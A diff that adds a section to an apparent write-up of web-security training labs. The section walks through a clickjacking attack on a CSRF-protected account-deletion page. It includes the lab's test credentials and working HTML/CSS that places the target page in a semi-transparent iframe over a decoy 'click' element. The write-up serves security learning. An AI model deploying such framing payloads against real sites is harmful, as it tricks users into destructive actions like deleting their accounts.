@@ -99,3 +99,61 @@ With a little JS, we can automatically submit the form:
 ```
 
 We store our payload in exploit server (Or we can deploy our own), deliver the link to the victim.
+
+## Clickjacking
+
+### Lab: Basic clickjacking with CSRF token protection
+
+**Description**:
+
+```
+This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.
+
+To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.
+
+You can log in to your own account using the following credentials: wiener:peter 
+```
+
+Simple, we'll create a website with 2 main components:
+* Our fake website, the one that'll be visible to the victim.
+* The target website, will be visibility hidden (using opacity), and placed on top of our fake website.
+
+The user will see our fake page however, any clicks will be sent to the invisible iframe.
+
+Our fake website:
+
+<p align="center">
+  <img src="/img/img4.png"><br/>
+</p>
+
+Code:
+
+```html
+<head>
+	<style>
+		#target_website {
+			position:relative;
+			width:400px;
+			height:700px;
+			 opacity:0.5;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+            top: 480px;
+            left: 70px;
+			width:300px;
+			height:400px;
+			z-index:1;
+			}
+	</style>
+</head>
+
+<body>
+	<div id="decoy_website">
+	<p>click</p>
+	</div>
+	<iframe id="target_website" src="https://0aa000c603d8752282c347e7009b00b5.web-security-academy.net/my-account">
+	</iframe>
+</body>
+```
